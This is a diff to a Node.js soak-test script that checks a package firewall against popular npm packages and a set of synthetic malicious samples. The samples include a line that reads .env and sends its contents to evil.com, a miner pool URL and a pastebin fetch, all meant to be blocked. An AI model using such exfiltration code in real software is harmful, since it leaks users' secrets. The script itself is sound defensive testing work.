@@ -1,11 +1,18 @@
 #!/usr/bin/env node
 /**
  * Aletheia soak test (Windows-safe, no npm spawning).
- * Install the corpus once by hand, then this script only requires each package
- * through the firewall and records the result. It NEVER calls npm.
- *   Setup once:  npm install lodash chalk ms semver debug uuid qs mime nanoid picocolors dayjs commander yargs axios express
- *   Run:         node aletheia-soak-test.js --agent ./packages/fw-agent
- *   Long soak:   node aletheia-soak-test.js --agent ./packages/fw-agent --rounds 100 --interval 300
+ *
+ * This version NEVER calls npm itself — that was the source of the
+ * `spawnSync npm ENOENT` / `npm.cmd EINVAL` errors on Windows.
+ * Instead, YOU install the test packages once by hand, and this script just
+ * requires each one through the firewall and records the result.
+ *
+ * SETUP (run once, in the repo root):
+ *   npm install <packages listed in corpus-top100.json>
+ *
+ * RUN:
+ *   node aletheia-soak-test.js --agent ./packages/fw-agent
+ *   node aletheia-soak-test.js --agent ./packages/fw-agent --rounds 100 --interval 300   (long soak)
  */
 const { execFileSync } = require('child_process');
 const fs = require('fs');
@@ -15,11 +22,15 @@ const args = process.argv.slice(2);
 const getArg = (k, d) => { const i = args.indexOf(k); return i >= 0 ? args[i + 1] : d; };
 const AGENT = path.resolve(getArg('--agent', './packages/fw-agent'));
 const ROUNDS = parseInt(getArg('--rounds', '1'), 10);
-const INTERVAL = parseInt(getArg('--interval', '0'), 10);
+const INTERVAL = parseInt(getArg('--interval', '0'), 10); // seconds between rounds
 
-const LEGIT = ["lodash","chalk","ms","semver","debug","uuid","qs","mime",
-  "nanoid","picocolors","dayjs","commander","yargs","axios","express"];
+// The packages to test. Edit this list freely, then `npm install` them once.
+const CORPUS_FILE = getArg('--corpus', 'corpus-top100.json');
+const LEGIT = fs.existsSync(CORPUS_FILE)
+  ? JSON.parse(fs.readFileSync(CORPUS_FILE, 'utf8'))
+  : ["lodash","chalk","ms","semver","debug","uuid","qs","mime","nanoid","picocolors","dayjs","commander","yargs","axios","express"];
 
+// Known-malicious synthetic samples (every one of these SHOULD be blocked).
 const MALICIOUS = {
   'miner.js':      "const p='stratum+tcp://xmr.pool.evil:3333'; module.exports={};",
   'stealer.js':    "const fs=require('fs');const s=fs.readFileSync('.env','utf8');require('https').get('http://evil.com?d='+s);",
@@ -28,18 +39,22 @@ const MALICIOUS = {
   'pasteexfil.js': "require('https').get('https://pastebin.com/raw/xxx');const x='//pastebin';",
 };
 
-const ROOT = process.cwd();
-const SAMPLES = path.join(ROOT, '.soak-samples');
+const ROOT = process.cwd();                       // where you run the script (the repo root)
+const SAMPLES = path.join(ROOT, '.soak-samples'); // malicious samples live here
 const RESULTS = path.join(ROOT, 'results');
 fs.mkdirSync(SAMPLES, { recursive: true });
 fs.mkdirSync(RESULTS, { recursive: true });
 
+// Which corpus packages are actually installed? (skip missing ones, don't crash)
 function installedPackages() {
   return LEGIT.filter(p => {
-    try { require.resolve(p, { paths: [ROOT] }); return true; } catch { return false; }
+    try { require.resolve(p, { paths: [ROOT] }); return true; }
+    catch { return false; }
   });
 }
 
+// Probe one require() under the firewall. Spawns `node` (a real .exe on Windows,
+// so this works where `npm` did not). Returns {blocked, rule, ms, err}.
 function probe(requireExpr) {
   const env = { ...process.env, FW_ENABLE_DETECTION: '1', FW_ALLOW_DEV_POLICY_KEY: '1' };
   const t0 = process.hrtime.bigint();
@@ -62,6 +77,7 @@ function runRound(round, corpus) {
     const fp = path.join(SAMPLES, name); fs.writeFileSync(fp, src);
     return { name, ...probe(`require(${JSON.stringify(fp)})`) };
   });
+
   const legitBlocked = legitResults.filter(r => r.blocked);
   const malCaught = malResults.filter(r => r.blocked);
   const summary = {
@@ -85,11 +101,11 @@ function runRound(round, corpus) {
   const corpus = installedPackages();
   const missing = LEGIT.filter(p => !corpus.includes(p));
   if (missing.length) {
-    console.log(`NOTE: ${missing.length} package(s) not installed, skipping: ${missing.join(', ')}`);
-    console.log(`      To include them: npm install ${missing.join(' ')}\n`);
+    console.log(`NOTE: ${missing.length} corpus package(s) not installed, skipping: ${missing.join(', ')}`);
+    console.log(`      To include them, run:  npm install ${missing.join(' ')}\n`);
   }
   if (!corpus.length) {
-    console.log('No corpus packages installed. Run once, then re-run:');
+    console.log('No corpus packages installed. Run this once, then re-run the soak test:');
     console.log(`  npm install ${LEGIT.join(' ')}`);
     process.exit(1);
   }
